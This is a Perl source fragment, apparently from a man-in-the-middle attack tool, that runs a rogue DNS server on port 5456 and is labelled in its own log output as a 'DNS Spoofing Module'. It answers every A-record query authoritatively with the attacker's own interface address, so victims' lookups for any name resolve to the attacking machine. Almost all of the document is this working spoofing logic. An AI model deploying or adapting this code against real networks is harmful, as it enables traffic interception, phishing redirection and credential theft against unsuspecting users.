sub DNS_Reply_Callback {
    my ($qname, $qclass, $qtype, $peerhost,$query,$conn) = @_;
    my ($rcode, @ans, @auth, @add);
           
    print "Received query from $peerhost to ". $conn->{sockhost}. "\n";

    if ($qtype eq "A") {
        my ($ttl, $rdata) = (3600, get_interface_address(GetSelectedInterface()));
        my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
        push @ans, $rr;
        $rcode = "NOERROR";

    }
    else{
        $rcode = "NXDOMAIN";
    }                                                                                                            
    # mark the answer as authoritive (by setting the 'aa' flag
    return ($rcode, \@ans, \@auth, \@add, { aa => 1 });
}

sub StartDNS_Server_Thread
{
    my $ns = new Net::DNS::Nameserver(
        LocalPort    => 5456,
        ReplyHandler => \&DNS_Reply_Callback,
        Verbose      => 1
    ) or AddLogInfo("couldn't create nameserver object\n");
    AddLogInfo("SITM DNS Spoofing Module Started on port 5456 !\n");
    if ($ns)
    {
        $ns->main_loop;
    }
    
}

return 1;